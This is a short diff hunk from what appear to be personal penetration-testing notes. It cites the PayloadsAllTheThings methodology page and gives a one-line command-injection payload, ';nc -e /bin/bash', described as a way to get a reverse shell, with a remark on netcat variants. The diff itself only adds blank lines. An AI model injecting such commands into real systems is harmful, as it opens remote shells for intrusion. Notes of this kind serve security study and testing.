@@ -3,3 +3,5 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 a simple input command to get a reverse shell is:
 ;nc -e /bin/bash //note: some variants of netcat don't support the -e option
+
+
